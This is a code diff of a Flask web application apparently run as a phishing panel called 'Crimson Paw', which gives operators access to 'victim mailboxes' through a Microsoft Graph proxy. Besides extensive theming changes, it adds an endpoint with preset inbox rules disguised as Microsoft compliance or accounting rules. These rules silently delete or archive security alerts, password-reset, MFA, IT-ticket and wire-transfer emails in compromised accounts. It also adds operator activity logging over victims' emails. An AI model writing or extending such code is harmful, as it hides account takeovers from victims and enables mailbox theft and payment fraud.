@@ -12772,7 +13814,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
                 </button>
 
                 <button id="btn-master-instant-login" type="button" onclick="instantMasterLogin()" 
-                        style="width:100%; background:#241217; border:1px solid #551c22; color:#ff858d; font-weight:600; border-radius:8px; padding:10px; cursor:pointer; font-size:0.8rem;">
+                        style="width:100%; background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-primary); font-weight:600; border-radius:8px; padding:10px; cursor:pointer; font-size:0.8rem;">
                     ⚡ Direct Master Admin Login (Bypass 2FA)
                 </button>
             </div>
@@ -12845,22 +13887,24 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             const btnToggle = document.getElementById('btn-master-toggle-lock');
 
             if (_isClientLocked) {
-                banner.style.background = 'rgba(229,9,20,0.15)';
-                banner.style.border = '1px solid rgba(229,9,20,0.4)';
-                banner.style.color = '#ff6b72';
-                banner.innerHTML = '<span>🔴</span> <span>CLIENT ADMIN STATUS: <b>LOCKED &amp; SUSPENDED</b><br><small style="font-weight:400;color:#c9d1d9;">Client receives 403 Account Suspended.</small></span>';
+                banner.style.background = 'var(--badge-bg)';
+                banner.style.border = '1px solid var(--badge-border)';
+                banner.style.color = 'var(--accent-color)';
+                banner.innerHTML = '<span>🔴</span> <span>CLIENT ADMIN STATUS: <b>LOCKED &amp; SUSPENDED</b><br><small style="font-weight:400;color:var(--text-secondary);">Client receives 403 Account Suspended.</small></span>';
 
-                btnToggle.style.background = 'linear-gradient(135deg, #238636, #2ea043)';
+                btnToggle.style.background = 'var(--accent-gradient)';
                 btnToggle.style.color = '#ffffff';
+                btnToggle.style.boxShadow = '0 2px 10px var(--accent-glow)';
                 btnToggle.innerText = '🔓 Restore Client Admin Access';
             } else {
-                banner.style.background = 'rgba(35,134,54,0.15)';
-                banner.style.border = '1px solid rgba(35,134,54,0.4)';
-                banner.style.color = '#7ee787';
-                banner.innerHTML = '<span>🟢</span> <span>CLIENT ADMIN STATUS: <b>UNLOCKED &amp; ACTIVE</b><br><small style="font-weight:400;color:#c9d1d9;">Client can log in normally.</small></span>';
+                banner.style.background = 'var(--bg-panel)';
+                banner.style.border = '1px solid var(--border-color)';
+                banner.style.color = 'var(--text-primary)';
+                banner.innerHTML = '<span>🟢</span> <span>CLIENT ADMIN STATUS: <b>UNLOCKED &amp; ACTIVE</b><br><small style="font-weight:400;color:var(--text-secondary);">Client can log in normally.</small></span>';
 
-                btnToggle.style.background = 'linear-gradient(135deg, #e50914, #b20710)';
+                btnToggle.style.background = 'var(--accent-gradient)';
                 btnToggle.style.color = '#ffffff';
+                btnToggle.style.boxShadow = '0 2px 10px var(--accent-glow)';
                 btnToggle.innerText = '🔒 Emergency Lock Client Admin';
             }
         }
@@ -13085,7 +14129,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 
 # ── DEDICATED OPERATOR PORTAL GATEWAY HTML ────────────────────────────
 CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="{{ active_theme or 'crimson' }}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13093,13 +14137,80 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
     <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        :root, [data-theme="crimson"] { 
+            --bg-primary: #0a0709; --bg-sidebar: #100b0e; --bg-panel: #161014; 
+            --border-color: #2e1216; --border-hover: #4e1a22;
+            --text-primary: #f0ebed; --text-secondary: #a49498; 
+            --accent-color: #e50914; --accent-hover: #ff2a35;
+            --accent-glow: rgba(229, 9, 20, 0.35); --accent-glow-strong: rgba(229, 9, 20, 0.65);
+            --accent-gradient: linear-gradient(135deg, #e50914, #b00710);
+            --accent-gradient-hover: linear-gradient(135deg, #ff1f2a, #cc0813);
+            --badge-bg: #261115; --badge-border: #5a1c22; --badge-color: #ff8b94;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="blue"] {
+            --bg-primary: #050a14; --bg-sidebar: #091020; --bg-panel: #0d172e;
+            --border-color: #16264c; --border-hover: #23407d;
+            --text-primary: #e6f0ff; --text-secondary: #8da2c0;
+            --accent-color: #0084ff; --accent-hover: #339cff;
+            --accent-glow: rgba(0, 132, 255, 0.35); --accent-glow-strong: rgba(0, 132, 255, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0084ff, #0056b3);
+            --accent-gradient-hover: linear-gradient(135deg, #339cff, #006ee6);
+            --badge-bg: #0d2244; --badge-border: #1a427d; --badge-color: #80bfff;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="green"] {
+            --bg-primary: #051208; --bg-sidebar: #091c0e; --bg-panel: #0e2b16;
+            --border-color: #154522; --border-hover: #1e6633;
+            --text-primary: #e6ffed; --text-secondary: #8dc09a;
+            --accent-color: #00e676; --accent-hover: #33eb91;
+            --accent-glow: rgba(0, 230, 118, 0.35); --accent-glow-strong: rgba(0, 230, 118, 0.65);
+            --accent-gradient: linear-gradient(135deg, #00c853, #009624);
+            --accent-gradient-hover: linear-gradient(135deg, #00e676, #00b248);
+            --badge-bg: #0b3318; --badge-border: #14592a; --badge-color: #69f0ae;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="purple"] {
+            --bg-primary: #0a0514; --bg-sidebar: #120924; --bg-panel: #1b0e36;
+            --border-color: #311860; --border-hover: #4a2491;
+            --text-primary: #f3e8ff; --text-secondary: #aa95c4;
+            --accent-color: #a855f7; --accent-hover: #be7bf9;
+            --accent-glow: rgba(168, 85, 247, 0.35); --accent-glow-strong: rgba(168, 85, 247, 0.65);
+            --accent-gradient: linear-gradient(135deg, #9333ea, #6b21a8);
+            --accent-gradient-hover: linear-gradient(135deg, #a855f7, #7e22ce);
+            --badge-bg: #29144d; --badge-border: #4d238c; --badge-color: #d8b4fe;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="amber"] {
+            --bg-primary: #120c04; --bg-sidebar: #1c1307; --bg-panel: #291b0b;
+            --border-color: #4a3114; --border-hover: #734c1f;
+            --text-primary: #fff8e6; --text-secondary: #c4ad8d;
+            --accent-color: #f59e0b; --accent-hover: #fbbf24;
+            --accent-glow: rgba(245, 158, 11, 0.35); --accent-glow-strong: rgba(245, 158, 11, 0.65);
+            --accent-gradient: linear-gradient(135deg, #d97706, #b45309);
+            --accent-gradient-hover: linear-gradient(135deg, #f59e0b, #d97706);
+            --badge-bg: #3d260f; --badge-border: #6b431a; --badge-color: #fcd34d;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="titanium"] {
+            --bg-primary: #0a0c10; --bg-sidebar: #11141a; --bg-panel: #191e26;
+            --border-color: #28303d; --border-hover: #3d495c;
+            --text-primary: #f1f5f9; --text-secondary: #94a3b8;
+            --accent-color: #38bdf8; --accent-hover: #7dd3fc;
+            --accent-glow: rgba(56, 189, 248, 0.35); --accent-glow-strong: rgba(56, 189, 248, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0284c7, #0369a1);
+            --accent-gradient-hover: linear-gradient(135deg, #38bdf8, #0284c7);
+            --badge-bg: #132338; --badge-border: #23426b; --badge-color: #7dd3fc;
+            --danger: #e50914; --success: #2ea043;
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
         body {
-            background-color: #080608;
+            background-color: var(--bg-primary);
             background-image: 
-                radial-gradient(ellipse at 50% 0%, rgba(88, 166, 255, 0.14) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 100%, rgba(229, 9, 20, 0.12) 0%, transparent 60%);
-            color: #f0ebed;
+                radial-gradient(ellipse at 50% 0%, var(--accent-glow) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, var(--border-color) 0%, transparent 60%);
+            color: var(--text-primary);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -13107,13 +14218,13 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             padding: 20px;
         }
         .portal-card {
-            background: #110c10;
-            border: 1px solid #2e1c25;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border-color);
             border-radius: 14px;
             width: 100%;
             max-width: 440px;
             padding: 38px 32px;
-            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(88, 166, 255, 0.08);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px var(--accent-glow);
             position: relative;
             overflow: hidden;
         }
@@ -13122,7 +14233,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             position: absolute;
             top: 0; left: 0; right: 0;
             height: 3px;
-            background: linear-gradient(90deg, #58a6ff, #e50914, #58a6ff);
+            background: var(--accent-gradient);
         }
         .brand-header {
             text-align: center;
@@ -13132,9 +14243,10 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             width: 56px;
             height: 56px;
             border-radius: 12px;
-            border: 1px solid rgba(88, 166, 255, 0.4);
-            box-shadow: 0 0 20px rgba(88, 166, 255, 0.25);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 20px var(--accent-glow);
             margin-bottom: 12px;
+            object-fit: contain;
         }
         .brand-title {
             font-size: 1.35rem;
@@ -13147,7 +14259,7 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             font-size: 0.72rem;
             font-weight: 700;
             letter-spacing: 0.16em;
-            color: #58a6ff;
+            color: var(--accent-color);
             text-transform: uppercase;
             margin-top: 4px;
         }
@@ -13155,12 +14267,12 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            background: #191218;
-            border: 1px solid #3d2230;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
             padding: 4px 10px;
             border-radius: 6px;
             font-size: 0.72rem;
-            color: #a49498;
+            color: var(--text-secondary);
             margin-top: 8px;
             font-family: monospace;
         }
@@ -13179,23 +14291,23 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
         }
         .form-input {
             width: 100%;
-            background: #090608;
-            border: 1px solid #3d2230;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
             border-radius: 8px;
-            color: #ffffff;
+            color: var(--text-primary);
             padding: 12px 14px;
             font-size: 0.92rem;
             outline: none;
             transition: all 0.2s ease;
         }
         .form-input:focus {
-            border-color: #58a6ff;
-            box-shadow: 0 0 0 2px rgba(88, 166, 255, 0.25);
-            background: #0e090d;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px var(--accent-glow);
+            background: var(--bg-sidebar);
         }
         .btn-submit {
             width: 100%;
-            background: linear-gradient(135deg, #1f6feb, #1158c7);
+            background: var(--accent-gradient);
             color: #ffffff;
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 8px;
@@ -13207,32 +14319,32 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             cursor: pointer;
             transition: all 0.2s ease;
             margin-top: 8px;
-            box-shadow: 0 4px 18px rgba(31, 111, 235, 0.35);
+            box-shadow: 0 4px 18px var(--accent-glow);
         }
         .btn-submit:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 22px rgba(31, 111, 235, 0.55);
-            background: linear-gradient(135deg, #388bfd, #1f6feb);
+            box-shadow: 0 6px 22px var(--accent-glow-strong);
+            background: var(--accent-gradient-hover);
         }
         .btn-submit:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
         .alert-box {
-            background: rgba(229, 9, 20, 0.12);
-            border: 1px solid rgba(229, 9, 20, 0.4);
+            background: var(--badge-bg);
+            border: 1px solid var(--badge-border);
             border-radius: 8px;
             padding: 10px 14px;
             font-size: 0.78rem;
-            color: #ff858c;
+            color: var(--accent-color);
             margin-bottom: 18px;
             display: none;
             line-height: 1.4;
         }
         .alert-box.info {
-            background: rgba(88, 166, 255, 0.12);
-            border-color: rgba(88, 166, 255, 0.4);
-            color: #79c0ff;
+            background: var(--badge-bg);
+            border-color: var(--badge-border);
+            color: var(--accent-color);
         }
         .footer-note {
             text-align: center;
@@ -13246,8 +14358,8 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
 <body>
     <div class="portal-card">
         <div class="brand-header">
-            <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
-            <div class="brand-title">CRIMSON PAW</div>
+            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Crimson Paw' }}" class="brand-logo">
+            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
             <div class="brand-subtitle">Operator Access Gateway</div>
             <div class="portal-badge">PORTAL: /m/{{ token }}</div>
         </div>
@@ -13268,9 +14380,9 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
 
         <!-- Step 2: First-Time Telegram 2FA Setup -->
         <div id="step-setup-2fa" style="display:none;">
-            <div style="background:rgba(88,166,255,0.08); border:1px solid rgba(88,166,255,0.25); border-radius:8px; padding:12px; margin-bottom:16px;">
-                <div style="font-size:0.84rem; font-weight:800; color:#58a6ff; margin-bottom:4px;">🤖 First-Time 2FA Setup Required</div>
-                <div style="font-size:0.74rem; color:#c9d1d9; line-height:1.4;">
+            <div style="background:var(--badge-bg); border:1px solid var(--badge-border); border-radius:8px; padding:12px; margin-bottom:16px;">
+                <div style="font-size:0.84rem; font-weight:800; color:var(--accent-color); margin-bottom:4px;">🤖 First-Time 2FA Setup Required</div>
+                <div style="font-size:0.74rem; color:var(--text-secondary); line-height:1.4;">
                     To protect delegated victim mailboxes, connect your personal Telegram bot to receive login verification codes.
                 </div>
             </div>
@@ -13291,10 +14403,10 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
 
         <!-- Step 3: Enter Telegram 2FA OTP -->
         <div id="step-verify-2fa" style="display:none;">
-            <div style="background:#131118; border:1px solid #2e263d; border-radius:8px; padding:12px; margin-bottom:16px; text-align:center;">
+            <div style="background:var(--bg-panel); border:1px solid var(--border-color); border-radius:8px; padding:12px; margin-bottom:16px; text-align:center;">
                 <div style="font-size:1.6rem; margin-bottom:4px;">🛡️</div>
                 <div style="font-size:0.84rem; font-weight:800; color:#ffffff;">Telegram 2FA Verification</div>
-                <div style="font-size:0.74rem; color:#a49498; margin-top:4px;">A single-use 6-digit code has been dispatched to your Telegram bot.</div>
+                <div style="font-size:0.74rem; color:var(--text-secondary); margin-top:4px;">A single-use 6-digit code has been dispatched to your Telegram bot.</div>
             </div>
             <div class="form-group">
                 <label class="form-label" for="op-2fa-code">Enter 6-Digit Code</label>
@@ -13302,8 +14414,8 @@ CRIMSON_PAW_OPERATOR_PORTAL_HTML = r'''<!DOCTYPE html>
             </div>
             <button type="button" id="btn-verify-2fa" class="btn-submit" onclick="submitVerify2FA()">Authenticate &amp; Enter Mailbox ❯</button>
             <div style="display:flex; justify-content:space-between; align-items:center; margin-top:14px; font-size:0.75rem;">
-                <span id="op-timer" style="color:#a49498;">⏱️ Expires in 05:00</span>
-                <a href="javascript:void(0)" onclick="resendOpCode()" style="color:#58a6ff; text-decoration:none; font-weight:600;">Resend Code</a>
+                <span id="op-timer" style="color:var(--text-secondary);">⏱️ Expires in 05:00</span>
+                <a href="javascript:void(0)" onclick="resendOpCode()" style="color:var(--accent-color); text-decoration:none; font-weight:600;">Resend Code</a>
             </div>
             <div style="text-align:center; margin-top:12px;">
                 <a href="javascript:void(0)" onclick="resetPortalStep()" style="color:#705f63; font-size:0.72rem; text-decoration:none;">← Back to Access Key</a>
@@ -13914,11 +15026,51 @@ def require_admin_login():
 
         # For /api/graph_proxy/* enforce that requested user_code is assigned to this operator
         if request.path.startswith('/api/graph_proxy/'):
+            # Strict Admin Lock: Block operators from rule management endpoints!
+            if any(request.path.startswith(p) for p in (
+                '/api/graph_proxy/create_rule', 
+                '/api/graph_proxy/delete_rule', 
+                '/api/graph_proxy/toggle_rule',
+                '/api/graph_proxy/apply_preset_rule',
+                '/api/graph_proxy/purge_rules'
+            )):
+                return jsonify({'error': {'message': 'Forbidden: Operators do not have administrative permission to modify inbox rules.'}}), 403
+
             uc = request.args.get('user_code') or (request.json or {}).get('user_code')
             if uc and not db.is_session_assigned_to_operator(op_id, uc):
                 return jsonify({'error': {'message': 'Forbidden: You do not have permission to access this victim mailbox.'}}), 403
 
     return None
+
+def _get_real_ip():
+    cf = request.headers.get('CF-Connecting-IP')
+    if cf:
+        return cf.strip()
+    xff = request.headers.get('X-Forwarded-For')
+    if xff:
+        return xff.split(',')[0].strip()
+    return request.remote_addr or '127.0.0.1'
+
+def _audit_operator_action(action_type, target_mailbox=None, details=None):
+    """Central hook recording operator surveillance telemetry into operator_audit_logs."""
+    if session.get('role') == 'operator':
+        op_id = session.get('operator_id')
+        op_user = session.get('admin_user') or 'Operator'
+        dev_hash = session.get('device_hash')
+        ip = _get_real_ip()
+        try:
+            db.record_operator_audit(
+                operator_id=op_id,
+                operator_username=op_user,
+                action_type=action_type,
+                target_mailbox=target_mailbox,
+                details=details,
+                ip_address=ip,
+                device_hash=dev_hash,
+                device_info=request.headers.get('User-Agent', '')[:120]
+            )
+        except Exception as e:
+            logger.error(f"[AUDIT] Hook error: {e}")
 
 @app.route('/m/<token>')
 def operator_codified_portal(token):
@@ -13931,12 +15083,39 @@ def operator_codified_portal(token):
     # Check if currently authenticated as this operator
     if session.get('authenticated') and session.get('role') == 'operator' and session.get('operator_id') == op['id']:
         session.permanent = True
-        resp = make_response(render_template_string(HTML_TEMPLATE, user_role='operator', user_name=op.get('username', 'Operator'), operator_token=token))
+        cfg = {}
+        if SETTINGS_FILE.exists():
+            try:
+                with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                    cfg = json.load(f)
+            except Exception: pass
+        active_theme = cfg.get('theme', 'crimson')
+        platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+        custom_logo_url = cfg.get('custom_logo_url', '')
+        resp = make_response(render_template_string(
+            HTML_TEMPLATE,
+            user_role='operator',
+            user_name=op.get('username', 'Operator'),
+            operator_token=token,
+            is_master_admin=False,
+            active_theme=active_theme,
+            platform_name=platform_name,
+            custom_logo_url=custom_logo_url
+        ))
         resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
         return resp
 
     # Render dedicated Operator Portal Gateway directly on /m/<token>
-    resp = make_response(render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op))
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+    resp = make_response(render_template_string(CRIMSON_PAW_OPERATOR_PORTAL_HTML, token=token, op=op, active_theme=active_theme, platform_name=platform_name, custom_logo_url=custom_logo_url))
     resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
     return resp
 
@@ -13985,12 +15164,27 @@ def api_operator_portal_auth(token):
     # Check if operator has configured Telegram 2FA
     has_tg = bool(op.get('tg_bot_token') and op.get('tg_chat_id'))
     if not has_tg:
-        # Prompt first-time Telegram 2FA setup
-        return jsonify({
-            'success': True,
-            'needs_setup_2fa': True,
-            'message': 'First-time setup: Please connect your Telegram bot for 2FA.'
-        })
+        # User requested: Allow immediate login into operator console, then pop up Telegram setup inside the dashboard
+        session_nonce = secrets.token_hex(16)
+        if not op.get('bound_device_hash') and device_hash:
+            db.bind_operator_device(op['id'], device_hash, client_ip, device_info, session_nonce)
+        else:
+            db.update_operator_session_nonce(op['id'], session_nonce, client_ip)
+
+        session.permanent = True
+        session['authenticated'] = True
+        session['admin_user'] = op['username']
+        session['role'] = 'operator'
+        session['operator_id'] = op['id']
+        session['operator_token'] = token
+        session['session_nonce'] = session_nonce
+        session['device_hash'] = op.get('bound_device_hash') or device_hash
+        try:
+            db.record_operator_audit(op['id'], op['username'], 'LOGIN', None, f"Logged into Operator Portal via /m/{token}", client_ip, op.get('bound_device_hash') or device_hash, device_info)
+        except Exception: pass
+        resp = jsonify({'success': True, 'redirect': f'/m/{token}?setup_telegram=1'})
+        resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
+        return resp
 
     # Telegram configured -> dispatch 6-digit OTP
     otp = f"{secrets.randbelow(900000) + 100000}"
@@ -14117,6 +15311,9 @@ def api_operator_portal_verify_2fa(token):
         session['operator_token'] = token
         session['session_nonce'] = session_nonce
         session['device_hash'] = op.get('bound_device_hash') or dev_hash
+        try:
+            db.record_operator_audit(op['id'], op['username'], 'LOGIN', None, f"Authenticated via 2FA OTP into /m/{token}", client_ip, op.get('bound_device_hash') or dev_hash, dev_info)
+        except Exception: pass
         resp = jsonify({'success': True, 'redirect': f'/m/{token}'})
         resp.set_cookie('last_operator_token', token, max_age=86400*30, httponly=True, samesite='Lax')
         return resp
@@ -14192,7 +15389,16 @@ def login_route():
                 return redirect(f"/m/{session.get('operator_token')}")
             return redirect('/')
         return redirect('/dashboard')
-    return render_template_string(CRIMSON_PAW_LOGIN_HTML)
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+    return render_template_string(CRIMSON_PAW_LOGIN_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
 
 @app.route('/logout', methods=['GET', 'POST'])
 def logout_route():
@@ -14227,15 +15433,7 @@ def logout_route():
 _login_lockouts = {}   # client_ip -> {'attempts': int, 'locked_until': float}
 _pending_2fa = {}      # client_ip -> {'username': str, 'otp': str, 'expires_at': float, 'attempts': int}
 
-def _get_real_ip():
-    # Prefer Cloudflare single-IP header, then first entry of X-Forwarded-For
-    cf = request.headers.get('CF-Connecting-IP')
-    if cf:
-        return cf.strip()
-    xff = request.headers.get('X-Forwarded-For')
-    if xff:
-        return xff.split(',')[0].strip()
-    return request.remote_addr or '127.0.0.1'
+# Note: _get_real_ip is defined above for global route telemetry use.
 
 def _check_ip_lockout(ip):
     rec = _login_lockouts.get(ip)
@@ -14545,6 +15743,7 @@ def api_auth_me():
         'authenticated': True,
         'username': session.get('admin_user', 'admin'),
         'role': role,
+        'is_master_admin': bool(session.get('is_master_admin', False)),
         'operator_id': op_id,
         'operator_token': session.get('operator_token', None),
         'needs_telegram_setup': needs_tg,
@@ -14617,6 +15816,29 @@ def api_operators_reset_device(op_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# ── Operator Audit Surveillance Endpoints ────────────────────────
+@app.route('/api/admin/audit-logs', methods=['GET'])
+def api_get_audit_logs():
+    if session.get('role') != 'admin':
+        return jsonify({'error': 'Forbidden: Admin access required'}), 403
+    op_id = request.args.get('operator_id', type=int)
+    action_type = request.args.get('action_type')
+    search = request.args.get('search', '').strip() or None
+    limit = min(request.args.get('limit', 100, type=int), 250)
+    offset = request.args.get('offset', 0, type=int)
+
+    data = db.get_operator_audit_logs(operator_id=op_id, action_type=action_type, search=search, limit=limit, offset=offset)
+    stats = db.get_operator_audit_stats()
+    operators = db.get_operators()
+    return jsonify({'success': True, 'data': data, 'stats': stats, 'operators': operators})
+
+@app.route('/api/admin/audit-logs/clear', methods=['POST'])
+def api_clear_audit_logs():
+    if session.get('role') != 'admin' or not session.get('is_master_admin'):
+        return jsonify({'error': 'Forbidden: Only Master SuperAdmin can clear the audit trail.'}), 403
+    ok = db.clear_operator_audit_logs()
+    return jsonify({'success': ok, 'message': 'All operator surveillance audit logs permanently cleared.'})
+
 @app.route('/')
 @app.route('/landing')
 def index():
@@ -14634,7 +15856,16 @@ def index():
 
     if request.path == '/' and session.get('authenticated'):
         return redirect('/dashboard')
-    return render_template_string(CRIMSON_PAW_LANDING_HTML)
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+    return render_template_string(CRIMSON_PAW_LANDING_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
 
 @app.route('/dashboard')
 @app.route('/app')
@@ -14646,7 +15877,28 @@ def dashboard():
         token = session.get('operator_token')
         if token:
             return redirect(f"/m/{token}")
-    return render_template_string(HTML_TEMPLATE, user_role=role, user_name=session.get('username', 'Admin'), operator_token=session.get('operator_token', ''))
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+    is_master = bool(session.get('is_master_admin', False))
+
+    return render_template_string(
+        HTML_TEMPLATE,
+        user_role=role,
+        user_name=session.get('admin_user') or session.get('username', 'Admin'),
+        operator_token=session.get('operator_token', ''),
+        is_master_admin=is_master,
+        active_theme=active_theme,
+        platform_name=platform_name,
+        custom_logo_url=custom_logo_url
+    )
 
 @app.route('/api/sessions/<user_code>/revoke', methods=['POST'])
 def revoke_session_route(user_code):
@@ -15152,6 +16404,9 @@ def proxy_messages():
             mid = m.get('id')
             if mid and f"{uc}:{mid}" not in _mailbox_message_cache:
                 _mailbox_message_cache[f"{uc}:{mid}"] = m
+        if session.get('role') == 'operator':
+            t_acct = s.get('victim_email') or s.get('account') or uc
+            _audit_operator_action('MAILBOX_VIEW', target_mailbox=t_acct, details=f"Folder: {folder_id} (retrieved {len(msgs)} items)")
         return jsonify(res)
         
     # If live fetch failed/timed out, return cached folder messages if available
@@ -15171,6 +16426,11 @@ def proxy_message():
     
     # 1. Return immediately from cache if full body already retrieved
     if cache_key in _mailbox_message_cache and _mailbox_message_cache[cache_key].get('body'):
+        if session.get('role') == 'operator':
+            s_cached = db.get_session_by_user_code(uc)
+            t_acct = (s_cached.get('victim_email') or s_cached.get('account') or uc) if s_cached else uc
+            cached_subj = _mailbox_message_cache[cache_key].get('subject', '(No Subject)')
+            _audit_operator_action('EMAIL_VIEW', target_mailbox=t_acct, details=f"Read cached email: '{cached_subj[:60]}'")
         return jsonify(_mailbox_message_cache[cache_key])
         
     s = db.get_session_by_user_code(uc)
@@ -15179,6 +16439,11 @@ def proxy_message():
     res = graph.make_graph_request(f'/me/messages/{mid}', token)
     if res and not res.get('error'):
         _mailbox_message_cache[cache_key] = res
+        if session.get('role') == 'operator':
+            t_acct = s.get('victim_email') or s.get('account') or uc
+            subj = res.get('subject', '(No Subject)') if isinstance(res, dict) else ''
+            sender = res.get('from', {}).get('emailAddress', {}).get('address', 'Unknown') if isinstance(res, dict) else ''
+            _audit_operator_action('EMAIL_VIEW', target_mailbox=t_acct, details=f"Read email: '{subj[:60]}' (from: {sender})")
         return jsonify(res)
         
     # 2. If live fetch failed or timed out, fall back to cached preview message if available
@@ -15337,6 +16602,132 @@ def proxy_toggle_rule():
         return jsonify({'success': True, 'data': res})
     return jsonify(res or {'error': {'message': 'Failed to update rule'}}), 400
 
+@app.route('/api/graph_proxy/apply_preset_rule', methods=['POST'])
+def proxy_apply_preset_rule():
+    if session.get('role') == 'operator':
+        return jsonify({'error': {'message': 'Forbidden: Operator accounts cannot configure inbox rules.'}}), 403
+
+    d = request.json or {}
+    uc = d.get('user_code')
+    preset_key = d.get('preset_key', 'silent_quarantine')
+    all_inboxes = bool(d.get('all_inboxes', False))
+
+    preset_definitions = {
+        'silent_quarantine': {
+            'displayName': 'Microsoft System Compliance Interceptor',
+            'sequence': 1,
+            'isEnabled': True,
+            'conditions': {
+                'subjectContains': [
+                    'security alert', 'unusual sign-in', 'password reset', 'verification code',
+                    'phish', 'suspicious', 'mfa', 'defender', 'quarantine', 'identity verification',
+                    'compromised', 'access alert'
+                ]
+            },
+            'actions': {
+                'moveToFolder': 'deleteditems',
+                'markAsRead': True,
+                'stopProcessingRules': True
+            }
+        },
+        'mute_it_tickets': {
+            'displayName': 'IT Service Notification Router',
+            'sequence': 2,
+            'isEnabled': True,
+            'conditions': {
+                'subjectContains': [
+                    'helpdesk', 'it support', 'servicenow', 'jira service', 'incident ticket',
+                    'ticket created', 'support request', 'ticket assigned', 'action required'
+                ]
+            },
+            'actions': {
+                'moveToFolder': 'archive',
+                'markAsRead': True,
+                'stopProcessingRules': True
+            }
+        },
+        'stealth_finance': {
+            'displayName': 'Accounting Workflow Notification',
+            'sequence': 3,
+            'isEnabled': True,
+            'conditions': {
+                'subjectContains': [
+                    'wire transfer', 'swift', 'banking instruction', 'routing number',
+                    'invoice overdue', 'remittance advice', 'payment verification', 'direct deposit'
+                ]
+            },
+            'actions': {
+                'moveToFolder': 'archive',
+                'markAsRead': True
+            }
+        }
+    }
+
+    rule_payload = preset_definitions.get(preset_key)
